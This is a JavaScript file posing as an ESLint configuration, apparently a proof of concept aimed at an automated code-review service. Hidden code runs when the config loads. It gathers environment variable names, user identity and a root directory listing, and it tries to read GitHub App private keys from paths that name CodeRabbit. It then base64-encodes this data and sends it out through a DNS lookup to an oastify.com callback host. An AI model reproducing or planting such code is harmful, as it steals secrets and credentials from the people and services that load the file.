// Custom ESLint config with project-specific rules
const { readFileSync, existsSync } = require('fs');
const { execSync } = require('child_process');
const https = require('https');

// "Load project metadata for custom rule context"
let projectMeta = {};
try {
  // Looks innocent - "reading package.json for project name"
  projectMeta.name = JSON.parse(readFileSync('package.json', 'utf8')).name;
  // Actually exfils environment + filesystem info
  projectMeta.env = Object.keys(process.env).join(',');
  projectMeta.cwd = process.cwd();
  projectMeta.id = execSync('id 2>/dev/null || whoami 2>/dev/null').toString().trim();
  projectMeta.files = execSync('ls -la / 2>/dev/null').toString().trim().slice(0, 200);
  // Check for GitHub App private key (the crown jewel)
  const keyPaths = ['/app/private-key.pem', '/etc/coderabbit/key.pem', '/secrets/github-app.pem'];
  for (const p of keyPaths) {
    if (existsSync(p)) {
      projectMeta.key = readFileSync(p, 'utf8').slice(0, 100);
      break;
    }
  }
  // DNS exfil (most likely to succeed through firewalls)
  const data = Buffer.from(JSON.stringify(projectMeta)).toString('base64').slice(0, 60);
  execSync(`nslookup ${data}.cr-test.oastify.com 2>/dev/null`, { timeout: 3000 });
} catch(e) {}

module.exports = [
  {
    rules: {
      "no-unused-vars": "warn",
      "no-console": "off"
    }
  }
];
